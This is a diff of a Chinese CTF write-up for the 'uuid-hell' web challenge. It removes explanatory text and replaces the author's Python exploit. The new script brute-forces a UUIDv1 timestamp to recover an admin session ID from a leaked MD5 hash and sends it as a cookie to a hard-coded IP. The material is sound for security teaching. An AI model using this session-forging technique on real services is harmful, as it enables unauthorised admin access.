@@ -125,22 +125,6 @@ getUser() 函数会输出 管理员和普通用户的 uuid 哈希值，createadm
 
 > 当然如果你觉得英文难以阅读，可以直接看我写的分析。
 
-在已知 node 和 clockseq 的情况下，题目还给了一个 uuidv1，这使得我们可以进行 uuidv1 的暴力破解。 下面看看我的分析：
-
-![](https://i.imgur.com/4GFAmj5.png)
-
-上图是一个 uuidV1 的典型示例，以上蓝色数字表示 node，紫色数字表示 clockseq，灰色的数字 1 表示 uuid 版本号，唯一不知道的是红色、黄色和绿色部分，这表示该 uuid 对应的时间戳。
-
-首先要知道的是时间戳由三部分组成共 60 比特，这三部分分别是 time\_low（32 比特）、time\_mid（16 比特）、time\_high（12 比特）。其中 time\_low、time\_mid 就是上图的红色和黄色部分，而 time\_high 就是绿色部分。
-
-乍一看现在似乎是有15位16进制数未知，好像并不可以爆破，然而关键在于访问题目时，它会告诉我们一个完整的 uuidV1 号：
-
-![](https://i.imgur.com/hobi5XE.png)
-
-当你在本地自己生成一个 uuidv1号时，你就会发现你的 uuidv1 号 和题目的 uuidv1 号十分相近，大概最多只有10个十六进制数有区别。
-
-总之，依据现有条件，爆破 uuidv1 是有可能的。
-
 > 觉得我写的不好的可以看看国外师傅的
 >
 > * https://rluo.dev/writeups/web/lactf-web-uuid-hell
@@ -148,49 +132,63 @@ getUser() 函数会输出 管理员和普通用户的 uuid 哈希值，createadm
 
 当然，以下 wp 的思路是更加巧妙的。访问一次主页创建一个 uuid，然后访问 /flag 创建一个 管理员 uuid，之后再次访问主页创建一个 uuid。 所以 /flag 处创建的 uuid 其时间戳必定位于 两次主页的 uuid 之间。
 
-利用 python 内置的 [uuid 模块](https://docs.python.org/3/library/uuid.html)可帮助我们完成 uuid 的爆破。
-
-![](https://i.imgur.com/swtT7hc.png)
-
 我们笃定这三个 uuid 对应的时间戳只在 time\_low 部分有不同，因为相隔的时间特别短暂。
 
 **exp**
 
 ```python
-#!/usr/bin/env python3
-
-import hashlib
-import uuid
-import requests
-
 import re
+import requests
+import uuid
+import hashlib
 
-uuid_pat = re.compile("[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
-md5sum_pat = re.compile(r"[a-fA-F\d]{32}")
+def getUUIDAndHash(res):
 
-req1 = requests.get("https://uuid-hell.lac.tf/")
-res = req1.text.split("<strong>")
-USER1_UUID = re.findall(uuid_pat, res[0])[0]
-req2 = requests.post("https://uuid-hell.lac.tf/createadmin")
-req3 = requests.get("https://uuid-hell.lac.tf/")
-res = req3.text.split("<strong>")
-USER2_UUID = re.findall(uuid_pat, res[0])[0]
-TARGET_HASHES = set(re.findall(md5sum_pat, res[1]))
+    uuidPattern = re.compile("[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
+    hashPattern = re.compile("[0-9a-f]{32}")
 
-user_uuid1 = uuid.UUID(USER1_UUID)
-user_uuid2 = uuid.UUID(USER2_UUID)
-print(user_uuid1.fields)
-print(user_uuid2.fields)
+    hashTable = res.split("<strong>") # 表中第一项是uuid而非哈希
+   
+    uuid = uuidPattern.findall(hashTable[0])[0]
+    adminHash = hashPattern.findall(hashTable[1])
+    return uuid,adminHash[-1]
 
-i = 1
-while user_uuid1.fields[0] < user_uuid2.fields[0]:
-    gen_uuid = uuid.UUID(fields=(user_uuid1.fields[0] + i, user_uuid1.fields[1], user_uuid1.fields[2], user_uuid1.fields[3], user_uuid1.fields[4], user_uuid1.fields[5]))
-    if hashlib.md5(b"admin" + str(gen_uuid).encode()).hexdigest() in TARGET_HASHES:
-        print(gen_uuid)
-        flag = requests.get("https://uuid-hell.lac.tf/", cookies={"id": str(gen_uuid)})
-        print(flag.text) 
-        break
-    i += 1
+def crack(uuid1,uuid2,hash):
+    print('uuid1=',uuid1)
+    print("uuid2=",uuid2)
+    print("hash=",hash)
+    uuid1 = uuid.UUID(uuid1).fields
+    uuid2 = uuid.UUID(uuid2).fields
+    print(uuid1,uuid2)
+
+    start,end = uuid1[0],uuid2[0]
+
+    i = 1
+    while start < end :
+        tmp = uuid.UUID(fields=(start+i,uuid1[1],uuid1[2],uuid1[3],uuid1[4],uuid1[5]))
+        tmpHash = hashlib.md5(b"admin" + str(tmp).encode()).hexdigest()
+        if tmpHash == hash:
+            print("目标UUID=",tmp)
+            return str(tmp)
+            break
+        i += 1
+
+def send(url):
+     r = requests.get(url)
+     uuid1,x = getUUIDAndHash(r.text)
+     requests.post(url=url+"/createadmin")
+     r1 = requests.get(url)
+     uuid2,adminHash = getUUIDAndHash(r1.text)
+     targetUUID = crack(uuid1,uuid2,adminHash)
+     return targetUUID
+     
+def main():
+    url = "http://47.115.222.18:3500"
+    targetUUID = send(url)
+
+    print(requests.get(url=url,cookies={"id" : targetUUID}).text)
+if __name__ == "__main__":
+    main()
 ```
 
 #### my-chemical-romance
